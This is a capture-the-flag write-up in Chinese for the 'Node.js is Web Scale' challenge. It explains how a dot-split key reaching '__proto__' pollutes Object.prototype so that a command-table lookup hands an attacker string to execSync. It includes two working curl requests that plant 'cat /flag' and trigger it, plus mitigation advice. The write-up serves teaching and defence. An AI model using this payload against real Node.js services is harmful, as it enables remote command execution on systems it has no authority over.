# Node.js is Web Scale

## 题目简述

服务用普通 JavaScript 对象 `store = {}` 充当内存键值库。`POST /set` 把用户提供的 `key` 按点分割，然后逐层访问或创建属性；`GET /execute?cmd=...` 则从另一个普通对象 `cmds` 中取出命令字符串，交给 `execSync` 执行。flag 位于 `/flag`。

决定性漏洞是 JavaScript 原型链污染：路由既没有拒绝 `__proto__`，也没有使用 `Map` 或无原型对象。攻击者可以经由 `store.__proto__` 写入 `Object.prototype`，让后续对 `cmds[攻击者键名]` 的查找命中继承属性，最终从数据写入跨越到命令执行。

## 解题过程

`/set` 的核心逻辑可约等价为：

```javascript
const keys = key.split('.');
let current = store;
for (let i = 0; i < keys.length - 1; i++) {
    if (!current[keys[i]]) current[keys[i]] = {};
    current = current[keys[i]];
}
current[keys.at(-1)] = value;
```

当 `key` 为 `__proto__.readflag` 时，`current['__proto__']` 不是一个普通数据项，而是 `Object.prototype`。最终赋值实际等价于：

```javascript
Object.prototype.readflag = 'cat /flag';
```

可用两个请求完成利用：

```bash
curl -sS -X POST 'http://TARGET/set' \
  -H 'Content-Type: application/json' \
  --data '{"key":"__proto__.readflag","value":"cat /flag"}'

curl -sS 'http://TARGET/execute?cmd=readflag'
```

`cmds` 自身没有 `readflag` 属性，但 `cmds['readflag']` 会沿原型链取到污染值。随后路由执行：

```javascript
const cmd = cmds[req.query.cmd];
res.send(execSync(cmd).toString());
```

因此第二个响应会直接包含 `/flag` 的内容。这里不需要覆盖 `getsource` 或 `test`，新造一个仅存在于原型上的命令名即可。

验证时可先用无害值 `echo prototype-polluted` 检查调用链，确认 `/execute?cmd=readflag` 返回该字符串后再换成 `cat /flag`。

## 方法总结

- 核心技巧：通过 `__proto__` 污染 `Object.prototype`，再利用另一个普通对象的继承属性进入 `execSync`。
- 识别信号：用户可控键名被点分割后逐层写入 `{}`，且业务代码用另一个对象作白名单或命令表。
- 复用要点：不能把普通对象当成天然安全的字典；应过滤 `__proto__` / `prototype` / `constructor`，或改用 `Map` / `Object.create(null)`，并在高危调用前检查自有属性。
